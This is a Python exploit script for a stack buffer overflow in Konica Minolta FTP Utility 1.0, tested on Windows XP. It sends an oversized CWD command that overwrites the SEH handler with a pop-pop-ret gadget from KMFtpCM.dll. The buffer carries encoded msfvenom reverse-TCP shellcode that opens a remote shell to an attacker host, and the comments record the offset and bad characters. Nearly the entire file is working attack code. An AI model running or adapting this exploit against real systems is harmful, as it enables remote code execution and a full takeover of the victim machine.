#!/usr/bin/python


# Konica Minolta FTP Utility 1.0
# Tested on Windows XP Pro x86


import socket
import sys

# SEH record (nseh field) at 0x00b2f978 overwritten with normal pattern : 0x36694235 (offset 1037), followed by 0 bytes of cyclic data after the handler
# 122063b0 : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [KMFtpCM.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.0.0.0 (C:\Program Files\KONICA MINOLTA\FTP Utility\KMFtpCM.dll)
# buffer = "A"* + [nSEH] + [SEH] + "D"
# bad characters = "\x00"
# msfvenom -p windows/shell_reverse_tcp LHOST=172.16.119.138 LPORT=4444 -b "\x00" -f c
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of c file: 1500 bytes

shellcode = (
"\xdb\xdd\xd9\x74\x24\xf4\xbf\x08\x94\x7a\x5f\x5d\x2b\xc9\xb1"
"\x52\x31\x7d\x17\x03\x7d\x17\x83\xcd\x90\x98\xaa\x31\x70\xde"
"\x55\xc9\x81\xbf\xdc\x2c\xb0\xff\xbb\x25\xe3\xcf\xc8\x6b\x08"
"\xbb\x9d\x9f\x9b\xc9\x09\x90\x2c\x67\x6c\x9f\xad\xd4\x4c\xbe"
"\x2d\x27\x81\x60\x0f\xe8\xd4\x61\x48\x15\x14\x33\x01\x51\x8b"
"\xa3\x26\x2f\x10\x48\x74\xa1\x10\xad\xcd\xc0\x31\x60\x45\x9b"
"\x91\x83\x8a\x97\x9b\x9b\xcf\x92\x52\x10\x3b\x68\x65\xf0\x75"
"\x91\xca\x3d\xba\x60\x12\x7a\x7d\x9b\x61\x72\x7d\x26\x72\x41"
"\xff\xfc\xf7\x51\xa7\x77\xaf\xbd\x59\x5b\x36\x36\x55\x10\x3c"
"\x10\x7a\xa7\x91\x2b\x86\x2c\x14\xfb\x0e\x76\x33\xdf\x4b\x2c"
"\x5a\x46\x36\x83\x63\x98\x99\x7c\xc6\xd3\x34\x68\x7b\xbe\x50"
"\x5d\xb6\x40\xa1\xc9\xc1\x33\x93\x56\x7a\xdb\x9f\x1f\xa4\x1c"
"\xdf\x35\x10\xb2\x1e\xb6\x61\x9b\xe4\xe2\x31\xb3\xcd\x8a\xd9"
"\x43\xf1\x5e\x4d\x13\x5d\x31\x2e\xc3\x1d\xe1\xc6\x09\x92\xde"
"\xf7\x32\x78\x77\x9d\xc9\xeb\xd4\x72\xa6\x61\x4c\x71\x48\x67"
"\xd1\xfc\xae\xed\xf9\xa8\x79\x9a\x60\xf1\xf1\x3b\x6c\x2f\x7c"
"\x7b\xe6\xdc\x81\x32\x0f\xa8\x91\xa3\xff\xe7\xcb\x62\xff\xdd"
"\x63\xe8\x92\xb9\x73\x67\x8f\x15\x24\x20\x61\x6c\xa0\xdc\xd8"
"\xc6\xd6\x1c\xbc\x21\x52\xfb\x7d\xaf\x5b\x8e\x3a\x8b\x4b\x56"
"\xc2\x97\x3f\x06\x95\x41\xe9\xe0\x4f\x20\x43\xbb\x3c\xea\x03"
"\x3a\x0f\x2d\x55\x43\x5a\xdb\xb9\xf2\x33\x9a\xc6\x3b\xd4\x2a"
"\xbf\x21\x44\xd4\x6a\xe2\x74\x9f\x36\x43\x1d\x46\xa3\xd1\x40"
"\x79\x1e\x15\x7d\xfa\xaa\xe6\x7a\xe2\xdf\xe3\xc7\xa4\x0c\x9e"
"\x58\x41\x32\x0d\x58\x40"
)



evil = "\x41"*1037 + "\xeb\x12\x90\x90" + "\xb0\x63\x20\x12" + "\x90"*30 + shellcode +"\x44"*(600-(len(shellcode)))

print '[+] Sending Evil Buffer...'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('172.16.119.129',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('CWD ' + evil + '\r\n')
s.recv(1024)

s.send('QUIT\r\n')
s.close

